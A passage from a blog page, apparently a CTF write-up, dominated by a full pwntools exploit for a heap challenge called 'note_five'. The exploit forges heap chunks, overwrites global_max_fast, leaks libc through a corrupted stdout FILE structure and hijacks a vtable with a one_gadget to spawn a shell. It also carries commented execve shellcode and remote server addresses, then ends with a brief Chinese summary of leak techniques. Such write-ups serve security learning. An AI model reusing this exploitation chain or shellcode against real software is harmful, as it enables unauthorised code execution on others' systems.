class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./note_five'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./note_five'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_mallocr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(mallocr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(mallocr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(mallocr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(mallocr)))</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"idx: "</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">"size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"idx:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"idx: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"content: "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">	malloc(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">	malloc(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">	malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">	malloc(<span class="number">4</span>,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line">	payload = <span class="string">'c'</span> * <span class="number">0xe0</span> + p64(<span class="number">0x2f0</span>) + <span class="string">'\x00'</span></span><br><span class="line">	edit(<span class="number">2</span>,payload)</span><br><span class="line">	free(<span class="number">3</span>)</span><br><span class="line">	malloc(<span class="number">0</span>,<span class="number">0x2f0</span> - <span class="number">0x10</span>)</span><br><span class="line">	payload = <span class="string">'\x11'</span> * <span class="number">0xf0</span> </span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">	payload += <span class="string">'\x22'</span> * <span class="number">0xf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + <span class="string">"\n"</span></span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	global_max_fast = <span class="number">0x77f8</span></span><br><span class="line">	stdout = <span class="number">0x77f8</span> - <span class="number">0x1229</span></span><br><span class="line">	payload = <span class="string">'\x11'</span> * <span class="number">0xf0</span></span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p16(<span class="number">0x77f8</span> - <span class="number">0x10</span>) + <span class="string">'\n'</span></span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	<span class="comment"># debug(0)</span></span><br><span class="line">	malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">	malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">	payload = <span class="string">'\x11'</span> * <span class="number">0xf0</span> </span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">	payload += <span class="string">'\x22'</span> * <span class="number">0xf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + <span class="string">"\n"</span></span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	payload = <span class="string">'\x11'</span> * <span class="number">0xf0</span> </span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">	payload += <span class="string">'\x22'</span> * <span class="number">0xf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">	payload += p16(stdout) + <span class="string">'\n'</span></span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	malloc(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">	malloc(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">	<span class="comment"># debug(0)</span></span><br><span class="line">	py = <span class="string">''</span></span><br><span class="line">	py += <span class="string">'a'</span>*<span class="number">0x41</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span> + <span class="string">'\n'</span> </span><br><span class="line">	edit(<span class="number">4</span>,py)</span><br><span class="line">	rc(<span class="number">0x40</span>)</span><br><span class="line">	libc_base = u64(rc(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">	onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">	fake_vtable = libc_base + <span class="number">0x3c5600</span><span class="number">-8</span> </span><br><span class="line">	binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">	py = <span class="string">'\x00'</span> + p64(libc_base+<span class="number">0x3c55e0</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)+p64(onegadget)+p64(fake_vtable) + <span class="string">'\n'</span></span><br><span class="line">	edit(<span class="number">4</span>,py)</span><br><span class="line">	<span class="comment"># trigger abort--&gt;flush</span></span><br><span class="line">	malloc(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">	</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        local = <span class="number">1</span></span><br><span class="line">        elf = ELF(<span class="string">'./note_five'</span>)</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(<span class="string">'./note_five'</span>)</span><br><span class="line">            libc = elf.libc</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'121.40.246.48'</span>,<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="string">"ls"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1569945916694.png" alt="56994591669"></p>
+<p>总结，IO_File是做堆题目时常用到的很好的方法，掌握泄露地址和改vtable实现控制程序执行流程，受益匪浅。</p>
+<p>小结：一般有两种方式去泄漏地址：</p>
+<p>第一种：</p>
+<p><img src="/blog_img/image-20200322181726307.png" alt="image-20200322181726307"></p>
+<p>第二种：</p>
+<p>原来有一次大堆块，然后通过切割得到含有真实地址的free的fastbin，再次伪造大堆块，通过覆盖写，从而修改fd指针，重点在于2次伪造大堆块</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
